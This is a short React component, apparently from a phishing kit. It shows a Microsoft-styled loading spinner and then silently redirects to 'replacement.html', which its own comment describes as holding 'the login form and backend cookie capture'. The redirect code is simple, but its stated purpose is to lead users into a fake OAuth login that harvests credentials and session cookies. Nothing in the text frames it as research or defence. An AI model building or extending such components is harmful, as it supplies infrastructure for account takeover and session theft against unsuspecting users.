import React, { useLayoutEffect } from 'react';

/**
 * RealOAuthRedirect Component
 * Redirects to replacement.html which contains the login form and backend cookie capture
 */
const RealOAuthRedirect: React.FC = () => {
  useLayoutEffect(() => {
    console.log('🔄 RealOAuthRedirect: Preparing to navigate to replacement page...');
    
    // ✅ Delay redirect for smooth page transition
    const timer = setTimeout(() => {
      console.log('🔄 RealOAuthRedirect: Navigating to replacement page...');
      window.location.replace('/replacement.html');
    }, 1500); // 1.5 second delay for gentle loading
    
    return () => clearTimeout(timer);
  }, []);

  // Loading screen shown during delay
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center'
      }}>
        <div style={{
          fontSize: '18px',
          color: '#323130',
          marginBottom: '20px'
        }}>
          Loading...
        </div>
        <div style={{
          border: '4px solid #f3f2f1',
          borderTop: '4px solid #0078d4',
          borderRadius: '50%',
          width: '40px',
          height: '40px',
          animation: 'spin 1s linear infinite',
          margin: '0 auto'
        }}></div>
      </div>
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default RealOAuthRedirect;
